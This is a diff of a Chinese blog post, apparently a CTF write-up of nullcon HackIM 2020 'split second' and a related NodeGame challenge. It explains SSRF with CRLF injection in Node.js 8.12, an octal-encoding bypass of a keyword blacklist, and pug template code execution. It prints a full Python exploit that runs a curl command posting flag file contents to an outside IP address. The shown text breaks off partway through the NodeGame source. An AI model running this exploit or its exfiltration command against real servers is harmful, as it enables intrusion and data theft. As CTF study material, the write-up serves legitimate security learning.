@@ -467,52 +467,334 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <h1 id="nullcon-hackim-2020-split-second"><a href="#nullcon-hackim-2020-split-second" class="headerlink" title="nullcon hackim-2020 split-second"></a>nullcon hackim-2020 split-second</h1><p>题目源码我fork后单独放在自己github上，有需要自取<br><a href="https://github.com/baiyecha404/hackim-web" target="_blank" rel="noopener">https://github.com/baiyecha404/hackim-web</a></p>
 <p>先讲解下出题人师傅参考的那道国际赛的题目吧。<br>首先题目的路由跟我们这道NodeGame基本一致，首先从flag路由可以看到</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/flag'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">if</span> (ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        <span class="keyword">var</span> authheader = req.headers[<span class="string">'adminauth'</span>];</span><br><span class="line">        <span class="keyword">var</span> pug2 = <span class="built_in">decodeURI</span>(req.headers[<span class="string">'pug'</span>]);</span><br><span class="line">        <span class="keyword">var</span> x=pug2.match(<span class="regexp">/[a-z]/g</span>);</span><br><span class="line">        <span class="keyword">if</span>(!x)&#123;</span><br><span class="line">         <span class="keyword">if</span> (authheader === <span class="string">"secretpassword"</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> html = pug.render(pug2);</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">        res.send(<span class="string">"No characters"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     res.send(<span class="string">"You need to come from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">app.get(&#39;/flag&#39;, function(req, res) {
+    var ip = req.connection.remoteAddress;
+    if (ip.includes(&#39;127.0.0.1&#39;)) {
+        var authheader = req.headers[&#39;adminauth&#39;];
+        var pug2 = decodeURI(req.headers[&#39;pug&#39;]);
+        var x=pug2.match(/[a-z]/g);
+        if(!x){
+         if (authheader === &quot;secretpassword&quot;) {
+            var html = pug.render(pug2);
+         }
+        }
+       else{
+        res.send(&quot;No characters&quot;);
+      }
+    }
+    else{
+     res.send(&quot;You need to come from localhost&quot;);
+    }
+});</code></pre>
 <p>core路由是：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/getMeme?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        resps = chunk.toString();</span><br><span class="line">                        res.send(resps);</span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<p>还有一个黑名单函数</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {
+    var q = req.query.q;
+    var resp = &quot;&quot;;
+    if (q) {
+        var url = &#39;http://localhost:8081/getMeme?&#39; + q
+        console.log(url)
+        var trigger = blacklist(url);
+        if (trigger === true) {
+            res.send(&quot;&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;&quot;);
+        } else {
+            try {
+                http.get(url, function(resp) {
+                    resp.setEncoding(&#39;utf8&#39;);
+                    resp.on(&#39;error&#39;, function(err) {
+                    if (err.code === &quot;ECONNRESET&quot;) {
+                     console.log(&quot;Timeout occurs&quot;);
+                     return;
+                    }
+                   });
 
+                    resp.on(&#39;data&#39;, function(chunk) {
+                        resps = chunk.toString();
+                        res.send(resps);
+                    }).on(&#39;error&#39;, (e) =&gt; {
+                         res.send(e.message);});
+                });
+            } catch (error) {
+                console.log(error);
+            }
+        }
+    } else {
+        res.send(&quot;search param &#39;q&#39; missing!&quot;);
+    }
+})</code></pre>
+<p>还有一个黑名单函数</p>
+<pre><code class="javascript">function blacklist(url) {
+    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];
+    var arrayLen = evilwords.length;
+    for (var i = 0; i &lt; arrayLen; i++) {
+        const trigger = url.includes(evilwords[i]);
+        if (trigger === true) {
+            return true
+        }
+    }
+}</code></pre>
 <p>以上就是源码中重要部分。除此以外还要先明确一点，题目使用的是Nodejs8.12.版本。并且使用pug作为模板引擎。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">var express = require(&#39;express&#39;);
+var app = express();
+var fs = require(&#39;fs&#39;);
+var path = require(&#39;path&#39;);
+var http = require(&#39;http&#39;);
+var pug = require(&#39;pug&#39;);</code></pre>
 <p>这个版本的Nodejs存在什么漏洞呢？如果去搜索会发现存在一个CVE,类型为CRLF injection。具体利用之后再提。现在我们来分析下上述源码的重要之处：<br>1./flag 这是我们的最终目的。一个重点是要达成<code>ip.includes(&#39;127.0.0.1)</code>。说明我们可能需要构造一个ssrf.在ip检查后，还有另一个条件<code>authheader === &quot;secretpassword&quot;</code>进行了http头的检查，达成后将进行<code>pug</code>的渲染，说明可能达成Nodejs的命令执行。而既然要对头进行检查，说明我们确实可能需要CRLF漏洞来进行http头的伪造。</p>
 <p>2.core路由允许我们传递参数q。之后与<code>http://localhost:8081/getMeme?</code>拼接，整个url经过一次黑名单检查后将执行。所以上面所需的ssrf在这已经帮我们准备好了。只需考虑绕过即可</p>
 <p>3.黑名单<br>从其中存在的关键字就可看出，这是Nodejs常见的命令执行的模板。我们以前用过的Nodejs命令执行payload:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;ls&#39;)</code></pre>
 <p>将不能直接传入。显然这里需要其他途径来编码绕过。</p>
 <p>既然如此我们来复现下,vps上搭好环境：<br>我们的CRLF漏洞，允许我们通过换行构造headers。同时也可以构造拆分ssrf。利用换行结束前一个请求，并发送另一个请求：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;core?q&#x3D;x HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">adminauth: secretpassword</span><br><span class="line">pug: - xxx</span><br></pre></td></tr></table></figure>
-<p>那么明确我们需要伪造的文件头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">adminauth: secretpassword</span><br><span class="line">pug: - code </span><br><span class="line">dummy:  HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p>pug处可以执行我们需要执行的命令。而关键headers里的参数已经绕过。既然如此，可以大致写出我们需要用CRLF注入的命令payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE</span><br></pre></td></tr></table></figure>
-<p>而只需<code>/core?q=payload</code>就执行了SSRF+CRLF。</p>
-<p>而为了bypass对pug的渲染问题，我们直接选择8进制绕过。因为它不像unicode或者16进制那样容易包含字母。所以使用八进制绕过。大概如下形式：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">"constructor"</span>]  有效</span><br><span class="line">[][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>] 有效，可执行</span><br><span class="line">[][\<span class="number">42</span>\<span class="number">143</span>\<span class="number">157</span>\<span class="number">156</span>\<span class="number">163</span>\<span class="number">164</span>\<span class="number">162</span>\<span class="number">165</span>\<span class="number">143</span>\<span class="number">164</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">42</span>] 无效，因为双引号被编码了</span><br></pre></td></tr></table></figure>
+<pre><code>GET /core?q=x HTTP/1.1
 
+
+GET /flag HTTP/1.1
+adminauth: secretpassword
+pug: - xxx</code></pre><p>那么明确我们需要伪造的文件头</p>
+<pre><code>GET /flag HTTP/1.1
+Host: 127.0.0.1
+adminauth: secretpassword
+pug: - code 
+dummy:  HTTP/1.1
+Host: localhost:8081
+Connection: close</code></pre><p>pug处可以执行我们需要执行的命令。而关键headers里的参数已经绕过。既然如此，可以大致写出我们需要用CRLF注入的命令payload：</p>
+<pre><code>SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE</code></pre><p>而只需<code>/core?q=payload</code>就执行了SSRF+CRLF。</p>
+<p>而为了bypass对pug的渲染问题，我们直接选择8进制绕过。因为它不像unicode或者16进制那样容易包含字母。所以使用八进制绕过。大概如下形式：</p>
+<pre><code class="javascript">[][&quot;constructor&quot;]  有效
+[][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;] 有效，可执行
+[][\42\143\157\156\163\164\162\165\143\164\157\162\42] 无效，因为双引号被编码了</code></pre>
 <p>这里参照dalao的exp<br><a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md</a></p>
 <p>(用的是py2,所以用虚拟机跑的才有正解):</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.utils <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toOct</span><span class="params">(str)</span>:</span></span><br><span class="line">	r=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">		<span class="keyword">if</span> i&gt;=<span class="string">'a'</span><span class="keyword">and</span> i&lt;=<span class="string">'z'</span>:</span><br><span class="line">			r+=<span class="string">'\\'</span>+oct(ord(i))[<span class="number">1</span>:]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r+=i</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment">#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\u&#123;xxxx&#125; is js encode pattern)</span></span><br><span class="line"><span class="comment">#Buffer.from('http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test', 'latin1').toString()</span></span><br><span class="line"><span class="comment">#Unicode čĊ will convert to latin1 which will only pick up the right most byte</span></span><br><span class="line">SPACE=<span class="string">u'\u0120'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">CRLF=<span class="string">u'\u010d\u010a'</span>.encode(<span class="string">'utf-8'</span>)  <span class="comment"># transfer from unicode to utf-8 (\uxxxx is unicode's pattern)</span></span><br><span class="line">SLASH=<span class="string">u'\u012f'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">pug = toOct(<span class="string">'''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 120.27.246.202:8888 -X POST -d $(cat fl*)'))")()'''</span>).replace(<span class="string">'"'</span>,<span class="string">'%22'</span>).replace(<span class="string">"'"</span>,<span class="string">"%27"</span>)<span class="comment">#' and " need to be double encoded</span></span><br><span class="line"><span class="keyword">print</span> quote(pug)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'sol'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF*<span class="number">2</span>+<span class="string">'GET'</span>+SPACE+SLASH+<span class="string">'flag'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF+<span class="string">'x-forwarded-for:'</span>+SPACE+<span class="string">'127.0.0.1'</span>+CRLF+<span class="string">'adminauth:'</span>+SPACE+<span class="string">'secretpassword'</span>+CRLF+<span class="string">'pug:'</span>+SPACE+pug+CRLF+<span class="string">'test:'</span>+SPACE</span><br><span class="line"></span><br><span class="line">res=requests.get(<span class="string">'http://120.27.246.202:8081/core?q='</span>+quote(payload))</span><br><span class="line"><span class="comment">#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># coding=UTF-8
+import requests
+from requests.utils import quote
+def toOct(str):
+    r=&quot;&quot;
+    for i in str:
+        if i&gt;=&#39;a&#39;and i&lt;=&#39;z&#39;:
+            r+=&#39;\\&#39;+oct(ord(i))[1:]
+        else:
+            r+=i
+    return r
+
+#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\u{xxxx} is js encode pattern)
+#Buffer.from(&#39;http://example.com/\u{010D}\u{010A}/test&#39;, &#39;latin1&#39;).toString()
+#Unicode čĊ will convert to latin1 which will only pick up the right most byte
+SPACE=u&#39;\u0120&#39;.encode(&#39;utf-8&#39;)
+CRLF=u&#39;\u010d\u010a&#39;.encode(&#39;utf-8&#39;)  # transfer from unicode to utf-8 (\uxxxx is unicode&#39;s pattern)
+SLASH=u&#39;\u012f&#39;.encode(&#39;utf-8&#39;)
+
+pug = toOct(&#39;&#39;&#39;-[][&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(this.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl 120.27.246.202:8888 -X POST -d $(cat fl*)&#39;))&quot;)()&#39;&#39;&#39;).replace(&#39;&quot;&#39;,&#39;%22&#39;).replace(&quot;&#39;&quot;,&quot;%27&quot;)#&#39; and &quot; need to be double encoded
+print quote(pug)
+
+payload=&#39;sol&#39;+SPACE+&#39;HTTP&#39;+SLASH+&#39;1.1&#39;+CRLF*2+&#39;GET&#39;+SPACE+SLASH+&#39;flag&#39;+SPACE+&#39;HTTP&#39;+SLASH+&#39;1.1&#39;+CRLF+&#39;x-forwarded-for:&#39;+SPACE+&#39;127.0.0.1&#39;+CRLF+&#39;adminauth:&#39;+SPACE+&#39;secretpassword&#39;+CRLF+&#39;pug:&#39;+SPACE+pug+CRLF+&#39;test:&#39;+SPACE
+
+res=requests.get(&#39;http://120.27.246.202:8081/core?q=&#39;+quote(payload))
+#res=requests.get(&#39;http://web2.ctf.nullcon.net:8081/core?q=&#39;+requote_uri(payload))
+print res.content</code></pre>
 <p>脚本中注意一下几点：<br>1.单引号与双引号均需要编码两次来绕过黑名单。<br>2.payload执行时是用<code>- code</code>的形式执行的。这是pug的特性。还可以<code>#{}</code>但是被过滤了<br>同时还学到了javascript中等价的表达方式，比如所参考的dalao的payload中用到了</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>](<span class="string">'console.log(payload)'</span>)()</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;console.log(payload)&#39;)()</code></pre>
 <p>等价于</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].constructor.constructor(<span class="string">'alert(12345)'</span>)()</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">[].constructor.constructor(&#39;alert(12345)&#39;)()</code></pre>
 <p>等价于</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.constructor(<span class="string">'alert(12345)'</span>)()</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">Array.constructor(&#39;alert(12345)&#39;)()</code></pre>
 <p>相当于借用了数组的构造方法来调用命令。<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>奇怪的是我又没弹到shell。curl命令到是没啥问题</p>
 <h1 id="NodeGame"><a href="#NodeGame" class="headerlink" title="NodeGame"></a>NodeGame</h1><p>出题人思路很简单，既然这个CRLF+ssrf漏洞可以构造headers,那构造文件上传也可以喽。所以就有了这个题目<br>先来看给的源码</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            